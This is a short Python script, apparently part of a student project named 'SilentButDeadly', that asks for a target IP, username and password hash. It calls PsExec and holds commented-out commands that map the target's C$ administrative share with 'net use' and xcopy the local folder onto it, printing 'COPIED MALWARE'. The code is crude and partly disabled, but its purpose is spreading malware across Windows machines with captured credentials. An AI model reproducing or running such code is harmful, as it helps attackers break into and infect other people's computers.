import os

if __name__ == '__main__':
    path = os.getcwd()
    print(path)
    path = path[:path.rindex(r'\l')]
    print(path)
    ip = input("enter IP")
    print(ip)
    user = input("enter username")
    print(user)
    password = input("enter hash")
    print(password)
    try:
        os.popen('PsExec').read()
    #     x = os.popen(r"Net use h: \\" + ip + r"\c$ /user:" + user + r" " + password + " /p:yes")
    #     print("CONNECTED")
    except:
        print("didn't initiate connection")
    # try:
    #     x = os.popen(r"xcopy " + path + r"\*.* h:\SilentButDeadly(CyberProject)\  /E /H /C /I")
    #     print("COPIED MALWARE")
    # except:
    #     print("didn't copy malware")
